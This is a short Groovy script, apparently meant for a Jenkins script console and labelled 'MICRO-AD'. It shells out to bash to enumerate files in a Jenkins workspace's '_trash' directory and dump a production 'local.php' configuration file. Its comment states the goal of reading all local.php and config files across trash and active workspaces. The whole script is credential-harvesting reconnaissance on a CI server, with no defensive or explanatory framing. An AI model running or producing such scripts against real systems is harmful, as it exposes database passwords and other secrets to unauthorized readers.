// MICRO-AD: Read ALL local.php + config files in _trash workspace + active workspaces
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(6000)
}

println "=== ALL FILES IN _trash/name_it ==="
def allFiles = run("find /var/jenkins_home/workspace/_trash/name_it -type f 2>/dev/null | head -80")
println allFiles.take(3000)

println "\n=== TRASH DIRECTORY STRUCTURE ==="
def dirStruct = run("find /var/jenkins_home/workspace/_trash/name_it -maxdepth 3 -type d 2>/dev/null")
println dirStruct.take(1000)

println "\n=== local.php PRODUCCION V2 ==="
def prodV2 = run("cat '/var/jenkins_home/workspace/_trash/name_it/Api/Produccion/V2/local.php' 2>/dev/null")
println prodV2.take(5000)

println "\n=== DONE MICRO-AD-1 ==="
